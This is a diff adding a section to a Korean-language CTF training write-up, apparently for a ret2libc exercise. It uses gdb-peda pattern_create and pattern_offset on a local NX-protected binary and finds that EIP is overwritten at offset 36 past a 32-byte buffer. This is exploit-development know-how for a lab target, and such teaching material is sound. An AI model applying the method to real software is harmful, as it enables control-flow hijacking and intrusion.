@@ -39,6 +39,65 @@ int main(int argc, char* argv[])
 ![Fig 1. stack][classic1]
 
 ## 버퍼의 크기
+우선 버퍼의 크기가 소스코드상에서는 32인데, 실제 Overflow 되어서 EIP가 덮어지는 정확한 지점을 알아야 한다.
+```
+$ gdb -q ./nxstack
+Reading symbols from ./nxstack...(no debugging symbols found)...done.
+```
+gdb-peda에 patter_create 와 patter_offset 기능을 활용하자.
+```
+gdb-peda$ pattern_create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+```
+길이 50의 임의의 패턴을 생성하였다. 이를 복사하여 run 하자.
+```
+gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+Starting program: /home/skcctf/ctf_training/day3/nx/nxstack 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x41412941 ('A)AA')
+ECX: 0xfbad0084
+EDX: 0xb7fcc870 --> 0x0
+ESI: 0x2
+EDI: 0xb7fcb000 --> 0x1b3db0
+EBP: 0x0
+ESP: 0xbffff610 ("AA0AAFAAbA")
+EIP: 0x61414145 ('EAAa')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x61414145
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff610 ("AA0AAFAAbA")
+0004| 0xbffff614 ("AFAAbA")
+0008| 0xbffff618 --> 0xbf004162
+0012| 0xbffff61c --> 0x0
+0016| 0xbffff620 --> 0x0
+0020| 0xbffff624 --> 0x0
+0024| 0xbffff628 --> 0xb7fcb000 --> 0x1b3db0
+0028| 0xbffff62c --> 0xb7fffc0c --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x61414145 in ?? ()
+```
+현재 SIGSEGV가 발생하여 프로그램이 강제로 종료되었으며 `0x61414145 in ?? ()`라는 구문이 출력되어 있다. 
+이는 EIP 레지스터에 해당 값이 들어있기 때문인데, 그 값의 위치에 접근하려다 실패했기 때문이다.
+```
+gdb-peda$ info register eip
+eip            0x61414145	0x61414145
+```
+그럼 peda가 생성했던 패턴 중 `0x61414145`은 어느 지점에 있었는지를 확인하면 return address 가 위치하는 곳을 알 수 있다.
+```
+gdb-peda$ pattern_offset 0x61414145
+1631666501 found at offset: 36
+```
+해당 지점은 36이다.
+
+즉, Buffer 가 32로 선언되어있고, 그 뒤에 EBX가 push되어 36칸을 차지하며 그 뒤로는 Return Address 가 위치하는데, 이 부분을 다른 함수의 주소로 덮어씌우면 Return 시에 그 함수를 수행하게 된다.
+
 ## return address 위치 찾기
 ## system() 의 주소
 ```
